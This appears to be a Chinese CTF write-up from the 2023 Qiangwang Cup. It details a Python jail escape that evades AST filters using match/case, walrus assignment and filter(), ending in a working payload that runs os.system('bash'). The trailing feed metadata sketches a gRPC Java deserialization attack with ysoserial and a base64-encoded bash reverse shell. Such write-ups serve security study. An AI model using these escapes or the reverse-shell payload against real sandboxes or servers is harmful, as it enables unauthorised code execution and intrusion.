    <span class="n">user_input</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>

  <span class="k">if</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1800</span><span class="p">:</span>
    <span class="nf">exec</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">:</span> <span class="n">BUILTINS</span><span class="p">},</span> <span class="p">{})</span>
</code></pre></div></div>
<p>BAD_ATS 过滤了非常多的 AST 类型，其中影响比较大的是下面的这几个：</p>
<ul>
  <li>ast.Attribute：最为致命，意味着 . 号获取属性无法使用。</li>
  <li>ast.Constant：无法使用常量，但我们可以通过函数来获取常量，例如 str(len[[]])=’0’</li>
  <li>ast.Subscript：无法使用索引、切片等。</li>
  <li>ast.ClassDef：不能够定义类。</li>
  <li>ast.For：不能使用 for 循环</li>
</ul>

<p>BUILTINS 中能够使用的函数都不具备 RCE 或者操作文件系统的功能，那么我们的思路就是绕过 no builtins。</p>

<p>构造:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="绕过-astattribute-获取属性">绕过 ast.Attribute 获取属性</h3>
<p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>

<p>最简单的示例，匹配字符串：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="mi">2</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">One</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Two</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Two
</span></code></pre></div></div>
<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AClass</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">thing</span> <span class="o">=</span> <span class="n">value</span>

<span class="n">item</span> <span class="o">=</span> <span class="nc">AClass</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="n">case</span> <span class="nc">AClass</span><span class="p">(</span><span class="n">thing</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Got </span><span class="si">{</span><span class="n">x</span> <span class="o">=</span> <span class="si">}</span><span class="s">!</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Got x = 32!
</span></code></pre></div></div>
<p>在这个示例中，重点关注<code class="language-plaintext highlighter-rouge">case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>

<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code class="language-plaintext highlighter-rouge">''.__class__</code>，我们可以编写如下的 match/case 语句：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">str</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>

<span class="c1"># True
</span></code></pre></div></div>
<p>可以看到 x 就是 <code class="language-plaintext highlighter-rouge">''.__class__</code>. 因为所有的类都输入 object 类，所以我们可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>

<span class="c1"># True
</span></code></pre></div></div>

<p>再测试一下该 payload 的 AST：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">ast</span> 

<span class="n">a</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
match str():
    case str(__class__=x):
        print(x)
</span><span class="sh">'''</span>
<span class="nf">print</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">'</span><span class="s">exec</span><span class="sh">'</span><span class="p">),</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
</code></pre></div></div>
<p>AST 如下：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
        <span class="nc">Match</span><span class="p">(</span>
            <span class="n">subject</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                <span class="n">args</span><span class="o">=</span><span class="p">[],</span>
                <span class="n">keywords</span><span class="o">=</span><span class="p">[]),</span>
            <span class="n">cases</span><span class="o">=</span><span class="p">[</span>
                <span class="nf">match_case</span><span class="p">(</span>
                    <span class="n">pattern</span><span class="o">=</span><span class="nc">MatchClass</span><span class="p">(</span>
                        <span class="n">cls</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                        <span class="n">patterns</span><span class="o">=</span><span class="p">[],</span>
                        <span class="n">kwd_attrs</span><span class="o">=</span><span class="p">[</span>
                            <span class="sh">'</span><span class="s">__class__</span><span class="sh">'</span><span class="p">],</span>
                        <span class="n">kwd_patterns</span><span class="o">=</span><span class="p">[</span>
                            <span class="nc">MatchAs</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)]),</span>
                    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
                        <span class="nc">Expr</span><span class="p">(</span>
                            <span class="n">value</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
                                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">print</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                                <span class="n">args</span><span class="o">=</span><span class="p">[</span>
                                    <span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">())],</span>
                                <span class="n">keywords</span><span class="o">=</span><span class="p">[]))])])],</span>
    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
</code></pre></div></div>
<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>

<p>我们可以构造替代 <code class="language-plaintext highlighter-rouge">''.__class__.__base__.__subclasses__()</code>的 payload：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__base__</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__subclasses__</span><span class="o">=</span><span class="n">subclazz</span><span class="p">):</span>
                        <span class="nf">print</span><span class="p">(</span><span class="n">subclazz</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="绕过-astassign-赋值变量">绕过 ast.Assign 赋值变量</h3>
<p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>
    <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="mi">111</span><span class="p">,</span>
    <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="mi">222</span>
<span class="p">]</span>
</code></pre></div></div>
<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
        <span class="nc">Expr</span><span class="p">(</span>
            <span class="n">value</span><span class="o">=</span><span class="nc">List</span><span class="p">(</span>
                <span class="n">elts</span><span class="o">=</span><span class="p">[</span>
                    <span class="nc">NamedExpr</span><span class="p">(</span>
                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">111</span><span class="p">)),</span>
                    <span class="nc">NamedExpr</span><span class="p">(</span>
                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">bash</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">222</span><span class="p">))],</span>
                <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()))],</span>
    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
</code></pre></div></div>

<h3 id="绕过-astconstant-获取数字字符串">绕过 ast.Constant 获取数字、字符串</h3>
<p>题目限制了 ast.Constant，所以我们无法直接使用数字、字符串常量，但通过其他的函数组合我们可以构造出数字和字符串。
例如：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">""</span> <span class="p">:</span> <span class="nf">str</span><span class="p">()</span>
<span class="mi">0</span>  <span class="p">:</span> <span class="nf">len</span><span class="p">([])</span>
<span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([]))</span>
<span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">]))</span>
<span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">(),</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">max</span><span class="p">]))</span>
<span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">])</span><span class="o">*</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">]))</span>
</code></pre></div></div>
<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但我们也可以自己手动实现一个 chr。</p>

<p>当然，题目 builtins 允许 dict 和 list，我们可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>

<p>在这个 payload 中，我们需要构造出 _wrap_close、system、bash</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>那么我们就可以通过下面的方式获取到这几个字符串：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>list<span class="o">(</span>dict<span class="o">(</span><span class="nv">system</span><span class="o">=[]))[</span>0]            <span class="c"># system</span>
list<span class="o">(</span>dict<span class="o">(</span><span class="nv">_wrap_close</span><span class="o">=[]))[</span>0]       <span class="c"># _wrap_close</span>
list<span class="o">(</span>dict<span class="o">(</span><span class="nv">bash</span><span class="o">=[]))[</span>0]              <span class="c"># bash</span>
</code></pre></div></div>

<h3 id="绕过-astsubscript-获取列表字典元素">绕过 ast.Subscript 获取列表/字典元素</h3>
<p>题目同时限定了 ast.Subscript，我们无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[])))</span>            <span class="c1"># system
</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))</span>       <span class="c1"># _wrap_close
</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>              <span class="c1"># bash
</span></code></pre></div></div>

<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
        <span class="nf">get_func</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="绕过-astfor-遍历列表">绕过 ast.For 遍历列表</h3>
<p>在构造最终 payload 中，我们还需要在 <code class="language-plaintext highlighter-rouge">__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时我们可以使用 filter，如下所示：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
    <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
    <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
        <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">subclazzes_item</span>
<span class="p">[</span>
    <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
<span class="p">]</span>
</code></pre></div></div>
<p>fitler 中使用 match/case 和 if 来进行过滤。</p>

<p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>

<h3 id="exp">EXP</h3>
<p>整合了所有的绕过手段，其实就可以编写出 payload 了。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">class_</span><span class="err">＿</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">base_</span><span class="err">＿</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">subclasses_</span><span class="err">＿</span><span class="o">=</span><span class="n">subclazzes</span><span class="p">):</span>
                        <span class="p">[</span>
                            <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[]))),</span>
                            <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>
                        <span class="p">]</span>
                        <span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
                            <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
                            <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
                                <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
                                    <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
                                        <span class="k">return</span> <span class="n">subclazzes_item</span>
                        <span class="p">[</span>
                            <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
                        <span class="p">]</span>
                        <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">init_</span><span class="err">＿</span><span class="o">=</span><span class="n">initz</span><span class="p">):</span>
                                <span class="n">match</span> <span class="n">initz</span><span class="p">:</span>
                                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">globals_</span><span class="err">＿</span><span class="o">=</span><span class="nb">globals</span><span class="p">):</span>
                                        <span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
                                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
                                                <span class="nf">get_func</span><span class="p">(</span><span class="n">system</span><span class="p">)(</span><span class="n">bash</span><span class="p">)</span>
</code></pre></div></div>

<p>新学到的一些绕过手法也会同步更新到 pyjail 系列博客😊。</p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></li>
  <li><a href="https://hurrison.com/posts/qwb2023/#pyjail--its-myast-">强网杯 2023 线上赛部分 Writeup - Hurrison’s Blog</a></li>
  <li><a href="https://henryiii.github.io/level-up-your-python/notebooks/2.8%20Pattern%20Matching.html">13. Structural Pattern Matching (Python 3.10+) — Level Up Your Python</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="thinkphp" /><category term="php" /><category term="spring" /><category term="qwb" /><category term="pyjail" /><summary type="html"><![CDATA[WEB happygame 题目提供了一个 gRPC 服务。gRPC 是一个由 Google 初始开发的高性能、开源的远程过程调用（RPC）框架。网上已有不少针对 gRPC 的安全研究： 【Black Hat Asia 2021系列分享】自动化挖掘 gRPC 网络接口漏洞 gRPC内存马研究与查杀 - 先知社区 gRPC 框架如下所示： 可见服务端由 Java 编写。 针对 gRPC 服务端，我们可以使用 gRPCurl 来逐步枚举服务端提供的接口以及接口定义。下载链接：fullstorydev/grpcurl: Like cURL, but for gRPC: Command-line tool for interacting with gRPC servers 根据工具文档，我们可以使用 list 来枚举接口，例如： grpcurl -vv 8.147.133.154:43668 list grpcurl -vv 8.147.133.154:43668 list helloworld.Greeter 使用 describe 来获取接口定义及参数信息: grpcurl -vv 8.147.133.154:43668 describe helloworld.Greeter.ProcessMsg helloworld.Greeter.ProcessMsg 接口可以接收一个 serializeData，发包格式如下： ./grpcurl -plaintext -d '{"serializeData":"xxxxx' -vv 8.147.133.154:43668 helloworld.Greeter/ProcessMsg 可以猜测此处存在反序列化漏洞，并且发送数据之后，接口的报错信息会提示我们需要发送 base64 编码数据。 测试 URLDNS 利用链时确认存在漏洞，然后利用 CC6 可以 getshell。 # bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1 # bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i} ysoserial CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}' | base64 -w 0 poc: ./grpcurl -plaintext -d 